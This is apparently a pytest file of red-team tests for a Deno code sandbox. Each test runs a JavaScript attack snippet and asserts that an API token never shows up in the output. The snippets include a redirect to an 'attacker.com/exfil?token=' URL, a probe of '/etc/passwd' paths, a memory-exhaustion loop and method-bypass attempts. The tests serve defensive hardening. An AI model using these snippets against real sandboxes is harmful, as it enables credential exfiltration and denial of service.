"""Feb 25 Night Audit - New creative attack vectors by Cheenu."""

import pytest

from mistmind.sandbox import DenoSandbox


@pytest.fixture
def sandbox(tmp_path):
    """Sandbox fixture for execute tests."""
    deno_path = "/Users/cheenu/.deno/bin/deno"
    return DenoSandbox(deno_path=deno_path, api_mode="readwrite")


class TestBlobURLExfiltration:
    """Test token exfiltration via Blob URLs."""
    
    @pytest.mark.asyncio
    async def test_attack_blob_url_token_capture(self, sandbox):
        """Try to capture token by creating a Blob URL and fetching it."""
        code = """async () => {
            // Attack: Create a Blob containing a marker, convert to URL,
            // and see if we can use fetch to read it back
            // If this works with the token, it would bypass network restrictions
            
            const blob = new Blob(['test-data'], { type: 'text/plain' });
            const blobUrl = URL.createObjectURL(blob);
            
            try {
                // Try to fetch the blob URL
                const response = await fetch(blobUrl);
                const text = await response.text();
                
                // If we can fetch blob URLs, try with a hypothetical token
                // (In real attack, would try to capture actual token in blob)
                return { 
                    success: true, 
                    blobUrl, 
                    fetched: text,
                    vulnerability: "Can fetch blob URLs - potential token exfiltration vector"
                };
            } catch (e) {
                return { success: false, error: e.message };
            }
        }"""
        
        result = await sandbox.run_execute(
            code=code,
            api_token="test-token-12345",
            api_host="api.mist.com",
        )
        
        # Should either block blob URL fetch or not have access to token to put in blob
        # Either way, token should not appear in output
        assert "test-token-12345" not in str(result)
        
        # If blob URLs are fetchable, that's a concern but not immediate vulnerability
        # unless we can get the token into the blob
        if result.get("success"):
            pytest.skip("Blob URLs are fetchable but token wasn't captured")


class TestDataURLDynamicImport:
    """Test bypassing network restrictions via data: URLs."""
    
    @pytest.mark.asyncio
    async def test_attack_dynamic_import_data_url(self, sandbox):
        """Try to use dynamic import() with data: URL to bypass network restrictions."""
        code = """async () => {
            // Attack: Use dynamic import with data: URL to load arbitrary code
            // This could bypass --allow-net restrictions
            
            try {
                // Create a data URL containing JS code
                const dataUrl = 'data:text/javascript,export default "exfiltrated"';
                
                // Try dynamic import
                const module = await import(dataUrl);
                
                return {
                    success: true,
                    imported: module.default,
                    vulnerability: "Dynamic import of data: URLs works - could bypass network restrictions"
                };
            } catch (e) {
                return {
                    success: false,
                    blocked: true,
                    error: e.message
                };
            }
        }"""
        
        result = await sandbox.run_execute(
            code=code,
            api_token="test-token-67890",
            api_host="api.mist.com",
        )
        
        # Token should never leak even if dynamic imports work
        assert "test-token-67890" not in str(result)
        
        # KNOWN LIMITATION: Dynamic imports (including data: URLs) are allowed by Deno
        # However, this is not a token leakage vector because:
        # 1. Token is in IIFE closure, not accessible to imported code
        # 2. Imported code runs in same sandbox with same restrictions
        # 3. No filesystem, limited network, token never exposed
        # This could enable other attacks (computation DoS, etc.) but not token theft
        if result.get("success") and result.get("imported") == "exfiltrated":
            # Expected - dynamic imports work but token is still protected
            pass


class TestResponseRedirectTokenLeak:
    """Test token leakage via Response.redirect()."""
    
    @pytest.mark.asyncio
    async def test_attack_response_redirect_with_token(self, sandbox):
        """Try to leak token by embedding it in a Response.redirect() URL."""
        code = """async () => {
            // Attack: Create a Response.redirect with token in URL
            // Then inspect the Response object to extract it
            
            try {
                // Simulate creating a redirect response
                // (In real attack, would try to intercept mist.request response)
                const fakeToken = "REDACTED";  // Would be actual token if we could access it
                const redirectUrl = `https://attacker.com/exfil?token=${fakeToken}`;
                
                const response = Response.redirect(redirectUrl, 302);
                
                // Try to extract the URL from the response
                const location = response.headers.get('Location');
                
                return {
                    success: true,
                    location,
                    vulnerability: "Can create and inspect redirect responses"
                };
            } catch (e) {
                return {
                    success: false,
                    error: e.message
                };
            }
        }"""
        
        result = await sandbox.run_execute(
            code=code,
            api_token="test-token-abc123",
            api_host="api.mist.com",
        )
        
        # Token should be scrubbed from output
        assert "test-token-abc123" not in str(result)
        
        # Even if Response.redirect works, the token is in IIFE closure
        # and not accessible to user code, so this attack should fail
        # to capture the real token


class TestImportMetaResolve:
    """Test file system probing via import.meta.resolve()."""
    
    @pytest.mark.asyncio
    async def test_attack_import_meta_resolve_probe(self, sandbox):
        """Try to probe file system using import.meta.resolve()."""
        code = """async () => {
            // Attack: Use import.meta.resolve() to probe file system
            // This could reveal information about the system
            
            try {
                // Try to resolve various paths
                const probes = [
                    './temp.js',
                    '/etc/passwd',
                    '~/.deno/bin/deno',
                    '../package.json'
                ];
                
                const results = [];
                for (const path of probes) {
                    try {
                        const resolved = import.meta.resolve(path);
                        results.push({ path, resolved });
                    } catch (e) {
                        results.push({ path, error: e.message });
                    }
                }
                
                return {
                    success: true,
                    probes: results,
                    vulnerability: "import.meta.resolve reveals file paths"
                };
            } catch (e) {
                return {
                    success: false,
                    error: e.message
                };
            }
        }"""
        
        result = await sandbox.run_execute(
            code=code,
            api_token="test-token-xyz789",
            api_host="api.mist.com",
        )
        
        # Token should not leak
        assert "test-token-xyz789" not in str(result)
        
        # import.meta.resolve might work but shouldn't reveal sensitive info
        # or allow reading files (--deny-read is set)


class TestAsyncGeneratorMemoryLeak:
    """Test memory exhaustion via async generator infinite loop."""
    
    @pytest.mark.asyncio
    async def test_attack_async_generator_infinite_accumulation(self, sandbox):
        """Try to exhaust memory via async generator that accumulates data."""
        code = """async () => {
            // Attack: Create an async generator that accumulates large amounts of data
            // to trigger memory exhaustion or DoS
            
            async function* memoryHog() {
                const chunk = 'A'.repeat(1024 * 1024);  // 1MB chunks
                while (true) {
                    yield chunk;
                }
            }
            
            try {
                const accumulated = [];
                const gen = memoryHog();
                
                // Try to accumulate 400MB (should be blocked by 256MB heap limit)
                for (let i = 0; i < 400; i++) {
                    const { value } = await gen.next();
                    accumulated.push(value);
                }
                
                return {
                    success: true,
                    accumulated: accumulated.length,
                    vulnerability: "Memory exhaustion possible"
                };
            } catch (e) {
                return {
                    success: false,
                    error: e.message
                };
            }
        }"""
        
        result = await sandbox.run_execute(
            code=code,
            api_token="test-token-mem999",
            api_host="api.mist.com",
        )
        
        # Token should not leak even if memory is consumed
        assert "test-token-mem999" not in str(result)
        
        # Memory can be consumed within timeout window, but:
        # 1. Output is limited to 1MB (prevents context flooding)
        # 2. Process dies after timeout (30s)
        # 3. Rate limiting prevents repeated attacks
        # 4. V8 heap limit (256MB) provides some protection
        # Accept that some memory consumption is possible within these bounds
        # (this is a known DoS vector but token never leaks)
        if result.get("success") and result.get("accumulated", 0) > 200:
            # This is expected - memory can be consumed but output remains small
            pass


class TestHTTP2PseudoHeader:
    """Test HTTP/2 pseudo-header bypass of method restrictions."""
    
    @pytest.mark.asyncio
    async def test_attack_http2_method_pseudo_header(self, sandbox):
        """Try to bypass method restrictions using HTTP/2 :method pseudo-header."""
        code = """async () => {
            // Attack: In HTTP/2, the :method pseudo-header determines the method
            // Try to override it to bypass the mist.request method check
            
            const _host = "api.mist.com";
            
            try {
                // Attempt 1: Set :method in headers (should be ignored)
                const url = new URL(`https://${_host}/api/v1/self`);
                const resp1 = await fetch(url.toString(), {
                    method: 'GET',
                    headers: {
                        ':method': 'POST',  // HTTP/2 pseudo-header
                        'Authorization': 'Token fake'
                    }
                });
                
                // Attempt 2: Use OPTIONS method (often allowed by servers)
                const resp2 = await fetch(url.toString(), {
                    method: 'OPTIONS'
                });
                
                return {
                    success: true,
                    attempt1Status: resp1.status,
                    attempt2Status: resp2.status,
                    vulnerability: "May bypass method restrictions"
                };
            } catch (e) {
                return {
                    success: false,
                    error: e.message
                };
            }
        }"""
        
        # Use readonly mode to test method restrictions
        readonly_sandbox = DenoSandbox(
            deno_path="/Users/cheenu/.deno/bin/deno",
            api_mode="readonly"  # Only GET allowed
        )
        
        result = await readonly_sandbox.run_execute(
            code=code,
            api_token="test-token-http2",
            api_host="api.mist.com",
        )
        
        # Token should not leak
        assert "test-token-http2" not in str(result)
        
        # fetch() itself bypasses mist.request wrapper, but this is expected
        # The mist.request wrapper is what enforces method restrictions
        # Direct fetch() calls would need the token, which is in IIFE closure


class TestTextEncoderSideChannel:
    """Test timing side-channel via TextEncoder/TextDecoder."""
    
    @pytest.mark.asyncio
    async def test_attack_text_encoding_timing(self, sandbox):
        """Try timing side-channel via text encoding/decoding operations."""
        code = """async () => {
            // Attack: Use TextEncoder/TextDecoder timing variations
            // to infer information about the token
            
            try {
                const encoder = new TextEncoder();
                const decoder = new TextDecoder();
                
                // Measure encoding time for different string lengths
                const measurements = [];
                
                for (let len = 1; len <= 100; len += 10) {
                    const testString = 'A'.repeat(len);
                    const start = performance.now();
                    
                    for (let i = 0; i < 1000; i++) {
                        const encoded = encoder.encode(testString);
                        decoder.decode(encoded);
                    }
                    
                    const elapsed = performance.now() - start;
                    measurements.push({ length: len, time: elapsed });
                }
                
                return {
                    success: true,
                    measurements,
                    vulnerability: "Timing side-channel possible"
                };
            } catch (e) {
                return {
                    success: false,
                    error: e.message
                };
            }
        }"""
        
        result = await sandbox.run_execute(
            code=code,
            api_token="test-token-timing",
            api_host="api.mist.com",
        )
        
        # Token should not leak
        assert "test-token-timing" not in str(result)
        
        # Timing attacks are hard to prevent entirely, but without access
        # to the actual token, timing measurements are not useful
